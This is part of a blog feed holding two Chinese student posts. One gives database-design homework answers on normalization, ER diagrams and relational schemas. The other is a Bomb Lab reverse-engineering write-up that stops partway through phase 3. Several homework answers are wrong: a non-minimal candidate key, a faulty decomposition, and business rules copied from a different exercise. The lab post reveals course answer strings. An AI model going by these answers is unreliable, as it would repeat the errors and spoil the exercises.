    <id>https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%9C%E4%B8%9A%E7%AC%AC%E5%85%AB%E7%AB%A0/</id>
    <published>2024-04-17T20:44:57.000Z</published>
    <updated>2024-04-21T10:08:40.788Z</updated>
    
    <content type="html"><![CDATA[<h2 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h2><p>数据库设计要解决什么问题?数据库设计面临哪些挑战?获取业务需求的5个途径是什么?数据库设计为什么是一门专业知识?对设计出来的数据库模式，如何判断它是否合理?关系型数据库中的表有什么特征?</p><p><strong>问题：</strong></p><ol><li>数据冗余问题</li><li>数据丢失问题</li><li>数据添加被抵制</li><li>数据不一致问题</li><li>数据结果错误</li></ol><p><strong>5个途径：</strong></p><ol><li>查看业务规章制度的文档</li><li>收集已有的业务表单</li><li>面对面沟通交流</li><li>观察业务的运转情况</li><li>分析、推理、研究、归纳提炼</li></ol><p><strong>是一门专业的原因</strong>：</p><p>数据库设计是一门专业知识，因为它涵盖的领域宽泛，包括数据结构、关系型理论、获取、处理和存储数据的技术、数据安全等。这需要专业的知识和技巧来完成。</p><p><strong>如何判断是否合理：</strong></p><ol><li>数据冗余度：冗余度低的数据库模式更合理。</li><li>数据一致性：模型设计能否保持数据的一致性。</li><li>扩展性：随着业务需求的变化，数据库模式是否能进行灵活的扩展。</li><li>性能：查询和更新数据的速度是否满足需求。</li></ol><p><strong>特征：</strong></p><ol><li>每张表都有一个唯一的名字，用于唯一标识。</li><li>表由行和列组成，行表示记录，列表示字段。</li><li>每张表都有一个主键字段，用于唯一标识一条记录。</li><li>表之间可以通过键的关联，形成数据之间的关系。</li></ol><h2 id="8-2"><a href="#8-2" class="headerlink" title="8-2"></a>8-2</h2><p>已知关系R(A，B，C，D)，有函数依赖集<code>F=&#123;A→C；B→D；B，D→A&#125;</code>，求R的所有候选键。判断R是否满足所有范式。如果不满足，对其进行分解，直至满足3NF，并判断所有函数依赖是否得到了保留。</p><p><strong>R的所有候选键：</strong></p><p><code>&#123;B，D&#125;</code></p><p><strong>判断</strong></p><p>满足第一范式，满足第二范式，不满足第三范式</p><p><strong>分解</strong></p><p><code>R1&#123;A,B,D&#125;</code> </p><p><code>R2&#123;A,C&#125;</code> </p><p><strong>都得到了保留</strong></p><h2 id="8-3"><a href="#8-3" class="headerlink" title="8-3"></a>8-3</h2><p>出租车公司有出租车、出租车司机和客户。出租车用车牌号标识，司机以工号标识，客户以编号标识。客户每租用一辆出租车，公司便派一个司机，产生一个出租工单RentSheet。出租工单包含如下数据项：businessNo(工单编号)、rentDate(出租日期)、rentTime(出租时间)、driverNo(司机工号)、driverName(司机姓名)、vehicleNo(车辆的车牌号码)、clientNo(客户编号)、clientName(客户姓名)、pickSite(接客地址)、destination(目的地)、endTime(完成时间)、price(费用)。每张出租工单都有唯一的工单编号。收费规则是按照租车时长来计算，每辆车的租车价位也不相同。</p><p>1)基于对业务的理解，针对出租工单，列出其中包含的所有的函数依赖。</p><p>2)列出RentSheet的所有候选键。</p><p>3)将关系RentSheet分解到第三范式。</p><p>将这个表单中的数据项从左向右命名为A-&gt;L</p><p><strong>1)</strong></p><p><code>F=&#123;A-&gt;B,C,D,E,F,G,H,I,J,K,L;D-&gt;E,F;G-&gt;H&#125;</code></p><p><strong>2)</strong></p><p>只有一个<code>&#123;A&#125;</code></p><p><strong>3)</strong></p><p><code>R1&#123;A,B,C,D,G,I,J,L,L&#125;</code></p><p><code>R2&#123;D,E,F&#125;</code></p><p><code>R3&#123;G,H&#125;</code></p><h2 id="8-4"><a href="#8-4" class="headerlink" title="8-4"></a>8-4</h2><p>图书馆的图书包括编号、书名、作者、出版社、类别、IBSN等属性。每本图书有多个副本，每个副本有一个副本号。读者到图书馆注册后方可借书，每次借阅不得超过4本。每本图书都有借阅天数的限制。过期不还图书者要罚款。罚款按过期天数计算。如果图书丢失，则要按书价的两倍赔偿。读者借阅时，可先查阅每本图书是否已全部借出。对于丢失了的图书，在赔偿处理之后，将其删掉。</p><p>1)设计该图书馆的图书借阅业务的ER图。</p><p>2)将所设计的ER图转化为关系模式，指明每个关系的主键，有外键的指明外键。</p><p><strong>1)</strong></p><p><img src="https://sf-bot-studio-plugin-resource.coze.com/obj/bot-studio-platform-plugin-sg/plantuml/fd126074-5c9c-4040-a21e-83a310c1179e.png"></p><p><strong>2)</strong></p><p>在这个ER图中，包含了以下实体：</p><ul><li><strong>BOOK</strong>（图书），每本图书包含有关键属性BookID(书籍编号), Title(书名), Author(作者) 和 ISBN。</li><li><strong>COPY</strong>（副本），每个副本有唯一的CopyID(副本号)和一种LoanStatus(借出状态)。</li><li><strong>PUBLISHER</strong>（出版社），拥有PublisherID(出版社编号), Name(名称) 和 Address(地址)。</li><li><strong>CATEGORY</strong>（类别），拥有CategoryID(类别编号) 和 Name(名称)。</li><li><strong>READER</strong>（读者），拥有ReaderID(读者编号), Name(名字) 和 RegistrationDate(注册日期)。</li><li><strong>LOAN</strong>（借阅），拥有LoanID(借阅交易编号), LoanDate(借阅日期), DueDate(应还日期), ReturnDate(归还日期) 和 Fine(罚款)。</li></ul><p>2）将ER图转化为关系模式，有以下关系：</p><ul><li><strong>PUBLISHER（出版社）</strong><ul><li>PublisherID (PK)</li><li>Name</li><li>Address</li></ul></li><li><strong>CATEGORY（类别）</strong><ul><li>CategoryID (PK)</li><li>Name</li></ul></li><li><strong>BOOK（图书）</strong><ul><li>BookID (PK)</li><li>Title</li><li>Author</li><li>ISBN</li><li>PublisherID (FK)</li><li>CategoryID (FK)</li></ul></li><li><strong>COPY（副本）</strong><ul><li>CopyID (PK)</li><li>BookID (FK)</li><li>LoanStatus</li></ul></li><li><strong>READER（读者）</strong><ul><li>ReaderID (PK)</li><li>Name</li><li>RegistrationDate</li></ul></li><li><strong>LOAN（借阅）</strong><ul><li>LoanID (PK)</li><li>ReaderID (FK)</li><li>CopyID (FK)</li><li>LoanDate</li><li>DueDate</li><li>ReturnDate (可以为空，因为可能尚未归还)</li><li>Fine (可为空，取决于是否过期)</li></ul></li></ul><h2 id="8-5"><a href="#8-5" class="headerlink" title="8-5"></a>8-5</h2><p>一驾校的业务情况为：有不同的培训科目，每个科目有收费额；有教员和几个培训组。驾校对教员每天考勤。每个培训组都有一些教员，有一个组长，至少负责一个科目。每个教员只能属于一个培训组。驾校定期开培训班，招收学员。学员报名时，选定一个培训班和一个科目。报名结束后，驾校根据报名情况，对每个科目给出一个排课详单，每个科目的教学班不得超过30名学员。学员参加一个培训班后，学习合格将获得合格证书。</p><p>1)设计该驾校培训业务的ER图。</p><p>2)将所设计的ER图转化为关系模式，指明每个关系的主键，有外键的指明外键。</p><p>3)对照范式检查每个关系是否满足所有范式?如果不满足，设法使之满足。</p><p>4)凭常识，说出两个该业务的业务规则约束。</p><p><strong>1)</strong></p><p><img src="https://sf-bot-studio-plugin-resource.coze.com/obj/bot-studio-platform-plugin-sg/plantuml/45faaedd-c43e-4f1e-b6c0-19702276d9f6.png" alt="ER Diagram for Driving School"></p><p><strong>2)</strong></p><ol><li>Training Subject ( <strong>subject_id</strong>, name, fee )<ul><li>主键: subject_id</li></ul></li><li>Trainer ( <strong>trainer_id</strong>, name, group_id )<ul><li>主键: trainer_id</li><li>外键: group_id 引用 Training Group(group_id)</li></ul></li><li>Training Group ( <strong>group_id</strong>, leader_id )<ul><li>主键: group_id</li><li>外键: leader_id 引用 Trainer(trainer_id)</li></ul></li><li>Class ( <strong>class_id</strong>, subject_id, group_id )<ul><li>主键: class_id</li><li>外键: subject_id 引用 Training Subject(subject_id)</li><li>外键: group_id 引用 Training Group(group_id)</li></ul></li><li>Student ( <strong>student_id</strong>, name, class_id, subject_id )<ul><li>主键: student_id</li><li>外键: class_id 引用 Class(class_id)</li><li>外键: subject_id 引用 Training Subject(subject_id)</li></ul></li><li>Attendance ( <strong>attendance_id</strong>, date, trainer_id )<ul><li>主键: attendance_id</li></ul></li></ol><p><strong>3)</strong></p><p>都满足；</p><p><strong>4)</strong></p><ol><li>调度员对未交费客户的工单调度限制：只有当客户完成支付后，才能被安排到工单中。这个规则保证了公司资金的流动和服务提供的前提条件。</li><li>旅游车的状态更新和调度：旅游车的状态（维修、待命、派出）关系到调度的可行性和调度员的工作效率。任何状态的变化都需要及时更新，确保所有调度在车辆可用的情况下进行。</li></ol><h2 id="8-6"><a href="#8-6" class="headerlink" title="8-6"></a>8-6</h2><p>旅游公司开辟了一些旅游线路，对外承接旅游接待业务。旅游线路包括线路名称、游玩路线出发时间、游玩时长、价格。对于一条旅游线路，一天中有多个出发时间。客户预订时，要填写姓名、身份证号、联系电话、微信号、email、旅游日期、选择的旅游线路、出发时间、人数。公司有一些旅游车，有一些司机、导游、调度员。公司员工都有工号、姓名、电话、月工资。旅游车有车牌号、座位数、车辆状态。车辆状态有“维修”“待命”“派出”三种。调度员每天安排游览时，根据游客预订情况以及车辆状态来进行调度安排。每车安排一个司机、一个导游、以工单进行调度。工单包括工单号、车牌号、线路名称、出发时间、司机、导游、游客。工单一旦排出，就马上短信通知游客、司机、导游。调度员派工单时，只安排交了费的游客，对没有交费的游客，则短信提醒交费。游客以微信方式交费。一旦交费，便会收到短信提示，包括交费方的微信号、交费额。请设计一个数据库来支持公司的业务开展，尽量实现业务处理的自动化。另外，公司为了拉动业务，奖励老游客介绍新游客。游客预定时，可填上介绍人的微信号。</p><p>1)设计旅游经营业务的ER图。</p><p>2)将所设计的ER图转化为关系模式，指明每个关系的主键，有外键的指明外键。</p><p>3)对照范式检查，看每个关系是否满足所有范式?如果不满足，则设法使之满足。</p><p>4)凭常识说出此业务的两个业务规则约束。</p><p><strong>1)</strong></p><p><img src="https://sf-bot-studio-plugin-resource.coze.com/obj/bot-studio-platform-plugin-sg/plantuml/a3c2b075-3179-4a78-b54d-64e8713745dd.png" alt="旅游经营业务ER图"></p><p><strong>2)</strong></p><ol><li>TourRoute ( route_name, departure_times, duration, price )<ul><li>主键: route_name</li></ul></li><li>Customer ( customer_id, name, identity_number, phone_number, wechat_id, email, tour_date, selected_route_name, selected_departure_time, number_of_people, referrer_wechat_id )<ul><li>主键: customer_id</li><li>外键: selected_route_name 引用 TourRoute.route_name</li></ul></li><li>Vehicle ( license_plate, seats, status )<ul><li>主键: license_plate</li></ul></li><li>Employee ( employee_id, name, phone_number, position, monthly_salary )<ul><li>主键: employee_id</li></ul></li><li>JobOrder ( order_id, license_plate, route_name, departure_time, driver_id, guide_id, customer_id )<ul><li>主键: order_id</li><li>外键: license_plate 引用 Vehicle.license_plate</li><li>外键: route_name 引用 TourRoute.route_name</li><li>外键: driver_id 引用 Employee.employee_id (司机)</li><li>外键: guide_id 引用 Employee.employee_id (导游)</li><li>外键: customer_id 引用 Customer.customer_id</li></ul></li><li>Payment ( payment_id, customer_id, amount, wechat_id )<ul><li>主键: payment_id</li><li>外键: customer_id 引用 Customer.customer_id</li></ul></li></ol><p><strong>3)</strong></p><p>都满足；</p><p><strong>4)</strong></p><ol><li>关于车辆调度的规则：每辆旅游车在同一时间只能被分配给一个旅游团，且车辆必须处于“待命”状态才能被分配。</li><li>关于付款的规则：游客必须在出发前完成支付，支付信息需要与游客的预订信息匹配，完成支付后游客、司机、导游将收到包含出发时间和地点的短信通知。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;8-1&quot;&gt;&lt;a href=&quot;#8-1&quot; class=&quot;headerlink&quot; title=&quot;8-1&quot;&gt;&lt;/a&gt;8-1&lt;/h2&gt;&lt;p&gt;数据库设计要解决什么问题?数据库设计面临哪些挑战?获取业务需求的5个途径是什么?数据库设计为什么是一门专业知识?对设计出来的数据库模</summary>
      
    
    
    
    <category term="作业" scheme="https://ycx6666.github.io/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="数据库系统" scheme="https://ycx6666.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Bomb Lab实验</title>
    <link href="https://ycx6666.github.io/2024/04/Bomb%E5%AE%9E%E9%AA%8C/"/>
    <id>https://ycx6666.github.io/2024/04/Bomb%E5%AE%9E%E9%AA%8C/</id>
    <published>2024-04-17T13:44:57.000Z</published>
    <updated>2024-04-27T07:37:15.308Z</updated>
    
    <content type="html"><![CDATA[<h3 id="软件2204-戴腾宇-202226010418"><a href="#软件2204-戴腾宇-202226010418" class="headerlink" title="软件2204 戴腾宇 202226010418"></a>软件2204 戴腾宇 202226010418</h3><h2 id="一、bomblab相关介绍"><a href="#一、bomblab相关介绍" class="headerlink" title="一、bomblab相关介绍"></a>一、bomblab相关介绍</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>   此次实验要求我们使用课程所学知识拆除“binary bombs”，增强对程序的机器级表示、汇编语言、调试器和逆向工程等方面原理与技能的掌握。</p><p>  一个“binary bombs”（二进制炸弹）是一个Linux可执行程序，包含了6个阶段。炸弹运行的每个阶段要求你输入一个特定字符串，你的输入符合程序预期的输入，该阶段的炸弹就被拆除引信即解除了，否则炸弹“爆炸”打印输出 “BOOM!!!”。</p><p>  实验的目标是拆除尽可能多的炸弹层次。 每个炸弹阶段考察了机器级程序语言的一个不同方面，难度逐级递增：</p><p>  阶段1：字符串比较</p><p>  阶段2：循环</p><p>  阶段3：条件&#x2F;分支</p><p>  阶段4：递归调用和栈</p><p>  阶段5：指针</p><p>  阶段6：链表&#x2F;指针&#x2F;结构</p><p>  隐藏阶段：只有在第4阶段的解后加特定字符串才会出现</p><p>  为完成二进制炸弹拆除任务，我们需要使用gdb调试器和objdump来反汇编炸弹的可执行文件并跟踪调试每一阶段的机器代码，从中理解每一汇编语言代码的行为或作用，进而设法推断拆除炸弹所需的目标字符串。比如在每一阶段的开始代码前和引爆炸弹的函数前设置断点。</p><p>  实验语言：C；实验环境：Linux</p><h3 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="2.实验步骤"></a>2.实验步骤</h3><h4 id="2-1-获取bomb"><a href="#2-1-获取bomb" class="headerlink" title="2.1.获取bomb"></a>2.1.获取bomb</h4><p>获取炸弹文件<code>bomb18_202226010418</code>，对应自己的学号</p><p>得到一个目录.&#x2F;bomb，其中包含如下文件：</p><p>​README：标识该bomb和所有者(匹配自己的学号)。</p><p>​bomb：bomb的可执行程序。</p><p>​bomb.c：bomb程序的main函数。</p><h4 id="2-2-拆除bomb"><a href="#2-2-拆除bomb" class="headerlink" title="2.2.拆除bomb"></a>2.2.拆除bomb</h4><p>  本实验的任务就是拆除炸弹。一定要在指定的虚拟机上完成作业，在其他的环境上运行有可能导致失败。</p><ol><li><p>运行.&#x2F;bomb可执行程序需要0或1个命令行参数（详见bomb.c源文件中的main()函数）。如果运行时不指定参数，则该程序打印出欢迎信息后，期望按行输入每一阶段用来拆除炸弹的字符串，根据当前输入的字符串决定是通过相应阶段还是炸弹爆炸导致任务失败。</p></li><li><p>也可将拆除每一阶段炸弹的字符串按行组织在一个文本文件中，然后作为运行程序时的唯一一个命令行参数传给程序，程序读入文件中的每一行直到遇到EOF，再转到从stdin等待输入。这样对于已经拆除的炸弹，就不用每次都重新输入，只用放进文件里即可。</p></li><li><p>要学会单步跟踪调试汇编代码以及学会设置断点。你还要学会如何检查寄存器和内存状态。很好的使用调试器是你在未来的职业生涯中赚到更多money的一项重要技能！</p></li></ol><h2 id="二、工具使用"><a href="#二、工具使用" class="headerlink" title="二、工具使用"></a>二、工具使用</h2><ul><li><p>gdb调试工具</p></li><li><p>objdump反汇编工具</p></li></ul><h2 id="三、准备工作"><a href="#三、准备工作" class="headerlink" title="三、准备工作"></a>三、准备工作</h2><p>1.打开bomb.c文件</p><blockquote><p>  发现main函数依次调用了phase_1到phase_6六个函数，但函数的具体代码被隐藏。可以知道从命令行输入的内容必须和phase函数里面的一样，否则炸弹爆炸。</p></blockquote><p>2.反汇编可执行文件bomb</p><p><code>  objdump -d bomb &gt; bomb.asm</code></p><p>  这样就可以在bomb.asm里面看到整个文件的汇编代码。</p><h2 id="四、进行拆弹"><a href="#四、进行拆弹" class="headerlink" title="四、进行拆弹"></a>四、进行拆弹</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08048b50 &lt;phase_1&gt;:</span><br><span class="line"> 8048b50:83 ec 1c             sub    $0x1c,%esp //当前栈指针减去0x1c</span><br><span class="line"> 8048b53:c7 44 24 04 84 a2 04 movl   $0x804a284,0x4(%esp) /*把这个地址的值放到esp+0x4的位置*/</span><br><span class="line"> 8048b5a:08 </span><br><span class="line"> 8048b5b:8b 44 24 20          mov    0x20(%esp),%eax //输入的参数</span><br><span class="line"> 8048b5f:89 04 24             mov    %eax,(%esp)</span><br><span class="line"> 8048b62:e8 3d 05 00 00       call   80490a4 &lt;strings_not_equal&gt; //调用函数，判断字符串是否相等</span><br><span class="line"> 8048b67:85 c0                test   %eax,%eax //测试是否等于0：如果%eax为0，那么test %eax,%eax后，零标志ZF（Zero Flag）会被置为1，表示结果等于0。</span><br><span class="line">检验符号：如果%eax的最高位（符号位）为1，那么test %eax,%eax后，符号标志SF（Sign Flag）会被置为1，表示结果为负。</span><br><span class="line"> 8048b69:74 05                je     8048b70 &lt;phase_1+0x20&gt;//为1跳转</span><br><span class="line"> 8048b6b:e8 46 06 00 00       call   80491b6 &lt;explode_bomb&gt;//否则调用爆炸函数</span><br><span class="line"> 8048b70:83 c4 1c             add    $0x1c,%esp</span><br><span class="line"> 8048b73:c3                   ret    </span><br></pre></td></tr></table></figure><ol><li><p>使用gdb查看地址0x804a284</p></li><li><p>在%eax种输入的是我们的参数，推测在0x804a284中存放的是用于比较的参数，即密码</p></li><li><p>在下一行设置断点</p></li><li><p>然后随便输入一个字符串，让程序继续运行下去</p></li><li><p>通过x&#x2F;s 0x804a284</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422220159435-17141416733591.png" alt="image-20240422220159435"></p></li></ol><p> “All your base are belong to us.”</p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048b74 &lt;phase_2&gt;:</span><br><span class="line"> 8048b74:56                   push   %esi</span><br><span class="line"> 8048b75:53                   push   %ebx</span><br><span class="line"> 8048b76:83 ec 34             sub    $0x34,%esp //开辟栈</span><br><span class="line"> ---</span><br><span class="line"> 8048b79:8d 44 24 18          lea    0x18(%esp),%eax //将0x18+esp的地址存入eax</span><br><span class="line"> 8048b7d:89 44 24 04          mov    %eax,0x4(%esp) //eax的值放入0x4+esp</span><br><span class="line"> 8048b81:8b 44 24 40          mov    0x40(%esp),%eax  //0x40+esp的值放入eax</span><br><span class="line"> 8048b85:89 04 24             mov    %eax,(%esp) //eax 的值放入esp</span><br><span class="line"> ---</span><br><span class="line"> 8048b88:e8 5e 07 00 00       call   80492eb &lt;read_six_numbers&gt; //读取六个数字</span><br><span class="line"> 8048b8d:83 7c 24 18 01       cmpl   $0x1,0x18(%esp) // 比较1和0x18(%esp)，相等设置ZF为1</span><br><span class="line"> 8048b92:74 05                je     8048b99 &lt;phase_2+0x25&gt;//1跳...99</span><br><span class="line"> 8048b94:e8 1d 06 00 00       call   80491b6 &lt;explode_bomb&gt;//不是1炸 第一个数只能是1</span><br><span class="line"> 8048b99:8d 5c 24 1c          lea    0x1c(%esp),%ebx  //je地址</span><br><span class="line"> 8048b9d:8d 74 24 30          lea    0x30(%esp),%esi //esp+0x1c到0x30中间的地址</span><br><span class="line"> 8048ba1:8b 43 fc             mov    -0x4(%ebx),%eax  //jne地址</span><br><span class="line"> 8048ba4:01 c0                add    %eax,%eax //乘以2</span><br><span class="line"> 8048ba6:39 03                cmp    %eax,(%ebx)//比较%eax和(%ebx)中的值</span><br><span class="line"> 8048ba8:74 05                je     8048baf &lt;phase_2+0x3b&gt;//跳转到这个函数</span><br><span class="line"> 8048baa:e8 07 06 00 00       call   80491b6 &lt;explode_bomb&gt; //调用爆炸函数</span><br><span class="line"> 8048baf:83 c3 04             add    $0x4,%ebx //++</span><br><span class="line"> 8048bb2:39 f3                cmp    %esi,%ebx </span><br><span class="line"> //判断是否已经过去了6个数</span><br><span class="line"> 8048bb4:75 eb                jne    8048ba1 &lt;phase_2+0x2d&gt; //如果不相等就跳  第二个数应该是第一个数的两倍</span><br><span class="line"> 8048bb6:83 c4 34             add    $0x34,%esp</span><br><span class="line"> 8048bb9:5b                   pop    %ebx</span><br><span class="line"> 8048bba:5e                   pop    %esi</span><br><span class="line"> 8048bbb:c3                   ret   </span><br></pre></td></tr></table></figure><p>“1 2 4 8 16 32”</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422220211762.png" alt="image-20240422220211762"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">08048bbc &lt;phase_3&gt;:</span><br><span class="line"> 8048bbc:83 ec 3c             sub    $0x3c,%esp</span><br><span class="line"> 8048bbf:8d 44 24 28          lea    0x28(%esp),%eax  //eax=0x28+esp=a</span><br><span class="line"> 8048bc3:89 44 24 10          mov    %eax,0x10(%esp) //将esp+0x28存放的数值放入esp+0x10=a</span><br><span class="line"> 8048bc7:8d 44 24 2f          lea    0x2f(%esp),%eax  //eax=esp+0x2f</span><br><span class="line"> 8048bcb:89 44 24 0c          mov    %eax,0xc(%esp)//将esp+0x2f存放的数值放入0xc+esp=b</span><br><span class="line"> 8048bcf:8d 44 24 24          lea    0x24(%esp),%eax//eax=24+esp</span><br><span class="line"> 8048bd3:89 44 24 08          mov    %eax,0x8(%esp)//将esp+0x24存放的数值放入0x8+esp=c</span><br><span class="line"> 8048bd7:c7 44 24 04 ca a2 04 movl   $0x804a2ca,0x4(%esp)//这个立即数放入0x4+esp中</span><br><span class="line"> 8048bde:08 </span><br><span class="line"> 8048bdf:8b 44 24 40          mov    0x40(%esp),%eax</span><br><span class="line"> 8048be3:89 04 24             mov    %eax,(%esp) //将0x40+esp放入eax，esp指向esp+40的值=d</span><br><span class="line"> 8048be6:e8 85 fc ff ff       call   8048870 &lt;__isoc99_sscanf@plt&gt;  </span><br><span class="line"> /*</span><br><span class="line"> 这里存在了一个输入，注意到前面将一个立即数存入了esp+0x4，使用x/s查看这个地址的信息</span><br><span class="line"> 发现这里输入了三个参数 &quot;%d %c %d&quot;对用int char int 分别对应了a,b,c</span><br><span class="line"> */</span><br><span class="line"> 8048beb:83 f8 02             cmp    $0x2,%eax//检查0x2和eax的大小</span><br><span class="line"> 8048bee:7f 05                jg     8048bf5 &lt;phase_3+0x39&gt;  //当eax&gt;2时跳转到bf5，其实也就是输入成功</span><br><span class="line"> 8048bf0:e8 c1 05 00 00       call   80491b6 &lt;explode_bomb&gt;//小于等于2就引爆炸弹，也就是输入的数x必须大于2，其实也就是输入失败了</span><br><span class="line"> 8048bf5:83 7c 24 24 07       cmpl   $0x7,0x24(%esp)//比较，如果esp+0x24的值大于7.，也就时c大于7</span><br><span class="line"> 8048bfa:0f 87 f3 00 00 00    ja     8048cf3 &lt;phase_3+0x137&gt; //大于7跳转到cf3，也就是炸弹爆炸的call，那么c必须小于等于7</span><br><span class="line"> /*</span><br><span class="line"> 这里给了一个提示，也就是在三个参数中，c的值是小于等于7的。</span><br><span class="line"> */</span><br><span class="line"> 8048c00:8b 44 24 24          mov    0x24(%esp),%eax //eax=c</span><br><span class="line"> 8048c04:ff 24 85 e0 a2 04 08 jmp    *0x804a2e0(,%eax,4) 跳转到4c+*0x804a2e0</span><br><span class="line"> /*</span><br><span class="line"> 这里对应了八个分支，也就是八种可能</span><br><span class="line"> */</span><br><span class="line"> 8048c0b:b8 66 00 00 00       mov    $0x66,%eax //eax=66</span><br><span class="line"> 8048c10:83 7c 24 28 67       cmpl   $0x67,0x28(%esp)  //比较a和67的大小</span><br><span class="line"> 8048c15:0f 84 e2 00 00 00    je     8048cfd &lt;phase_3+0x141&gt; //如果a=67，跳转到8048cfd</span><br><span class="line"> 8048c1b:e8 96 05 00 00       call   80491b6 &lt;explode_bomb&gt;//不相等，炸，也就是说a必须等于67</span><br><span class="line"> 8048c20:b8 66 00 00 00       mov    $0x66,%eax  //eax=66</span><br><span class="line"> 8048c25:e9 d3 00 00 00       jmp    8048cfd &lt;phase_3+0x141&gt;  //跳转到8048cfd，那里比较b和66的大小</span><br><span class="line"> 8048c2a:b8 76 00 00 00       mov    $0x76,%eax  //eax=76</span><br><span class="line"> 8048c2f:83 7c 24 28 52       cmpl   $0x52,0x28(%esp) //比较a和52的大小</span><br><span class="line"> 8048c34:0f 84 c3 00 00 00    je     8048cfd &lt;phase_3+0x141&gt; //如果a=52，跳转到cfd</span><br><span class="line"> 8048c3a:e8 77 05 00 00       call   80491b6 &lt;explode_bomb&gt;  //不相等，炸，也就是说a必须等于52</span><br><span class="line"> 8048c3f:b8 76 00 00 00       mov    $0x76,%eax //eax=76</span><br><span class="line"> 8048c44:e9 b4 00 00 00       jmp    8048cfd &lt;phase_3+0x141&gt;  //跳转到cfd,那里比较b和76的大小</span><br><span class="line"> 8048c49:b8 64 00 00 00       mov    $0x64,%eax //eax=64</span><br><span class="line"> 8048c4e:83 7c 24 28 73       cmpl   $0x73,0x28(%esp) //比较a和73大小</span><br><span class="line"> 8048c53:0f 84 a4 00 00 00    je     8048cfd &lt;phase_3+0x141&gt;  //相等跳转到cfd,那里比较b和73的大小</span><br><span class="line"> 8048c59:e8 58 05 00 00       call   80491b6 &lt;explode_bomb&gt; //不相等爆</span><br><span class="line"> 8048c5e:b8 64 00 00 00       mov    $0x64,%eax //eax=64</span><br><span class="line"> 8048c63:e9 95 00 00 00       jmp    8048cfd &lt;phase_3+0x141&gt; //跳转到cfd,那里比较b和64的大小</span><br><span class="line"> 8048c68:b8 6f 00 00 00       mov    $0x6f,%eax //eax=6f</span><br><span class="line"> 8048c6d:81 7c 24 28 0b 01 00 cmpl   $0x10b,0x28(%esp) //比较a和10b大小</span><br><span class="line"> 8048c74:00 </span><br><span class="line"> 8048c75:0f 84 82 00 00 00    je     8048cfd &lt;phase_3+0x141&gt; //相等跳转到cfd,那里比较b和6f的大小</span><br><span class="line"> 8048c7b:e8 36 05 00 00       call   80491b6 &lt;explode_bomb&gt; //不相等爆</span><br><span class="line"> 8048c80:b8 6f 00 00 00       mov    $0x6f,%eax //eax=6f</span><br><span class="line"> 8048c85:eb 76                jmp    8048cfd &lt;phase_3+0x141&gt; 